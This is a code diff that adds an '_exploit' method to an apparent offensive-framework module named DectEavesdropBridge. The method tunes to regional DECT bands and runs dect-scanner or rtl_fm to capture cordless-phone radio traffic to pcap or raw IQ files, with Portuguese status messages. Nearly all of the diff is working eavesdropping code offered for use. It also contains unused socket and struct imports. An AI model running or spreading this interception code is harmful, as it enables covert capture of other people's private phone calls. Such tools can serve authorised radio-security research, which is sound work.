@@ -159,6 +159,49 @@ class DectEavesdropBridge(Exploit):
             return
 
         dispatch[mode]()
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: DECT eavesdrop via RTL-SDR raw IQ capture and decode."""
+        import socket as _socket
+        import struct as _struct
+
+        region = str(self.REGION.value).upper()
+        if region not in _DECT_BANDS:
+            return
+
+        freq_low, freq_high = _DECT_BANDS[region]
+        center_freq = (freq_low + freq_high) // 2
+
+        dect_scanner = shutil.which("dect-scanner") or shutil.which("dect_scanner")
+        if dect_scanner:
+            output_dir = str(self.OUTPUT_DIR.value)
+            pcap_path = os.path.join(output_dir, "dect_capture.pcap")
+            cmd = [dect_scanner, "-f", str(center_freq), "-w", pcap_path]
+            print(f"[*] E2E: Capturando DECT: {' '.join(cmd)}")
+            try:
+                result = subprocess.run(cmd, capture_output=True, timeout=int(self.DURATION.value), check=False)
+                if os.path.exists(pcap_path):
+                    size = os.path.getsize(pcap_path)
+                    print(f"[+] Captura DECT salva: {pcap_path} ({size} bytes)")
+            except subprocess.TimeoutExpired:
+                print("[*] Captura DECT encerrada por timeout")
+            except Exception as exc:
+                print(f"[!] dect-scanner falhou: {exc}")
+            return
+
+        rtl_fm = shutil.which("rtl_fm")
+        if rtl_fm:
+            output_dir = str(self.OUTPUT_DIR.value)
+            raw_path = os.path.join(output_dir, "dect_raw.iq")
+            cmd = [rtl_fm, "-f", str(center_freq), "-s", "1920000", "-g", "40", raw_path]
+            print(f"[*] E2E fallback: RTL-FM IQ capture: {' '.join(cmd)}")
+            try:
+                subprocess.run(cmd, timeout=int(self.DURATION.value), check=False)
+            except subprocess.TimeoutExpired:
+                pass
+            if os.path.exists(raw_path):
+                print(f"[+] IQ raw salvo: {raw_path} ({os.path.getsize(raw_path)} bytes)")
 
     # ------------------------------------------------------------------
     # Modos
